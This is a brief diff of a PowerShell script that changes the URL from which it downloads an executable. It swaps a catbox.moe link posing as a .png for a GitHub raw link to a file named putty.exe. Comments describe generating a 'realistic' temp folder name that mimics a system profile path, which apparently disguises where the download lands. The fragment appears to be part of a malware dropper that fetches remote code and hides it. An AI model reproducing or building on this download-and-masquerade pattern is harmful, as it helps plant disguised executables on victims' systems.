@@ -52,7 +52,7 @@ function Generate-TempFolderName {
 # Download application from URL
 try {
     # URL of the application to download
-    $downloadUrl = "https://files.catbox.moe/7k2nkr.png"  # Replace with actual URL
+    $downloadUrl = "https://github.com/MillyNine/1/raw/refs/heads/main/putty.exe"  # Replace with actual URL
     
     # Generate realistic temp folder name matching systemprofile pattern
     $tempFolderName = Generate-TempFolderName
